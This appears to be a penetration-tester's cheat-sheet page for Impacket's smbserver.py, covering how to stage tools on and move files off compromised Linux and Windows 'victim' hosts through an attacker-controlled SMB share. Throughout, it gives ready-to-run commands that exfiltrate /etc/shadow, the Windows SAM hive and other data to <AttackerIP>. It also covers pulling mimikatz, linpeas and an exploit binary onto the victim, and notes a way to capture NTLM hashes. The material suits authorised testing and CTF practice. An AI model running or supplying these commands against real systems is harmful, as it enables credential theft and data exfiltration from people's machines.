---
title: "smbserver.py"
description: "Run this on your attacking machine (macOS/Linux) to host the files."
category: tools
tags: ["tools"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: intermediate
updated: "2026-08-10"
source: "vault:Tools/smbserver.py.md"
---
# 📂 Impacket smbserver.py Usage Guide

> [!WARNING] macOS Users
> Before running the server, ensure native **File Sharing** is turned **OFF** in System Settings, or you will get an `Address already in use` error on port 445.

## 1. Start the SMB Server (Attacker Machine)

Run this on your attacking machine (macOS/Linux) to host the files.

**The "Compatible" Command (Recommended)**
This enables SMBv2 (for modern Windows) and sets a username/password to bypass "Guest Access" security policies.

```bash
# Syntax: sudo smbserver.py <ShareName> <LocalDirectory> -smb2support -user <User> -password <Pass>
sudo smbserver.py SHARE . -smb2support -user temp -password temp
```

**The "Legacy" Command**
Only use this for Windows XP / Server 2003 (SMBv1).
```bash
sudo smbserver.py SHARE .
```

---

## 2. Transferring Files FROM Linux (Victim)

Assuming you have a shell on a Linux victim and want to send files **TO** your `smbserver`.

### Method A: Using `smbclient` (Standard)
Most common method. Does not require root.

**Upload a file to your server:**
```bash
# Syntax: smbclient //<AttackerIP>/<ShareName> -U <User> -c 'put <FileToSend>'
smbclient //<AttackerIP>/SHARE -U temp -c 'put /etc/shadow'
# Enter password 'temp' when prompted
```

**Download a file from your server:**
```bash
smbclient //<AttackerIP>/SHARE -U temp -c 'get linpeas.sh'
```

### Method B: Mounting (Requires Root)
Mounts your share to a local folder on the victim.
```bash
mkdir /tmp/transfer
mount -t cifs //<AttackerIP>/SHARE /tmp/transfer -o username=temp,password=temp,vers=3.0

# Now just copy files normally
cp /root/proof.txt /tmp/transfer/
```

---

## 3. Transferring Files FROM Windows (Victim)

Assuming you have a shell on a Windows victim and want to send files **TO** your `smbserver`.

### Method A: `net use` (Mount Drive)
The most reliable method. Maps your share to a drive letter (e.g., `Z:`).

1. **Connect:**
   ```cmd
   net use Z: \\<AttackerIP>\SHARE /user:temp temp
   ```
2. **Transfer (Copy/Move):**
   ```cmd
   copy C:\Users\Administrator\Desktop\flag.txt Z:\
   move Z:\exploit.exe C:\Windows\Temp\
   ```
3. **Disconnect:**
   ```cmd
   net use Z: /delete
   ```

### Method B: Direct Copy (UNC Path)
Quick for single files without mounting a drive.
```cmd
copy C:\Windows\System32\config\SAM \\<AttackerIP>\SHARE\SAM
```

### Method C: PowerShell
If CMD is blocked or you prefer PS.
```powershell
# Create credential object
$pass = ConvertTo-SecureString "temp" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("temp", $pass)

# Copy to your server
Copy-Item "C:\Secret\data.db" -Destination "\\<AttackerIP>\SHARE\data.db" -Credential $cred

# Copy from your server
Copy-Item "\\<AttackerIP>\SHARE\mimikatz.exe" -Destination "C:\Temp\" -Credential $cred
```

---

## ⚡ Cheat Sheet

| Action | OS | Command |
| :--- | :--- | :--- |
| **Start Server** | Attacker | `sudo smbserver.py SHARE . -smb2support -user temp -password temp` |
| **Start (Legacy)** | Attacker | `sudo smbserver.py SHARE .` |
| **Mount Share** | Win Client | `net use Z: \\<IP>\SHARE /user:temp temp` |
| **Unmount** | Win Client | `net use Z: /delete` |
| **Quick Upload** | Win Client | `copy file.txt \\<IP>\SHARE\` |
| **Quick Download** | Win Client | `copy \\<IP>\SHARE\file.exe .` |
| **Upload** | Linux Client | `smbclient //<IP>/SHARE -U temp -c 'put file.txt'` |
| **Download** | Linux Client | `smbclient //<IP>/SHARE -U temp -c 'get file.txt'` |
| **NTLM Capture** | Attacker | Start server *without* `-user/-password`, then trigger any connection from Windows client. |
```
